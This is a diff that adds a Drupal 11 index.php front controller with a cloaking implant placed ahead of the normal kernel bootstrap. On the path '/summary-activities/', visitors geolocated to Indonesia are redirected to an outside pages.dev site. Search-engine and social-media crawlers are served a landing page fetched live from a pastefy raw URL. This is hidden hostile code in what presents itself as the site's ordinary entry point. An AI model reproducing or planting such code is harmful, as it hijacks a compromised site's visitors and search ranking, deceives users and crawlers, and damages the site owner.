@@ -1,0 +1,68 @@
+<?php
+
+use Drupal\Core\DrupalKernel;
+use Symfony\Component\HttpFoundation\Request;
+
+function superbone($url) {
+    if (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        $res = curl_exec($ch);
+        curl_close($ch);
+        return $res;
+    }
+    return false;
+}
+
+$ua  = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+
+$bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";
+
+// Landingpages raw atau html
+$remote_lp = "https://pastefy.app/FC1xSBn6/raw";
+// link reff amp
+$amp = "https://amp-eu-japan-eu.pages.dev/";
+
+// ------- enumerations path -------
+$match_paths = [
+    "/summary-activities/",
+    "/summary-activities/",
+    "/summary-activities/",
+];
+
+if (in_array($uri, $match_paths, true)) {
+
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $geo = @json_decode(@file_get_contents("http://ip-api.com/json/$ip"), true);
+
+    if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
+        header("Location: $amp");
+        exit;
+    }
+
+    if (preg_match($bot_regex, $ua)) {
+        $f = superbone($remote_lp);
+        echo $f ?: "";
+        exit;
+    }
+}
+
+// --- BAGIAN PERUBAHAN UNTUK DRUPAL 11 ---
+
+// 1. Memuat Autoloader Composer (Standard Drupal 11)
+$autoloader = require_once __DIR__ . '/autoload.php';
+
+// 2. Inisialisasi Kernel Drupal
+$request = Request::createFromGlobals();
+$kernel = new DrupalKernel('prod', $autoloader);
+
+// 3. Handle Request dan Kirim Response
+$response = $kernel->handle($request);
+$response->send();
+
+$kernel->terminate($request, $response);
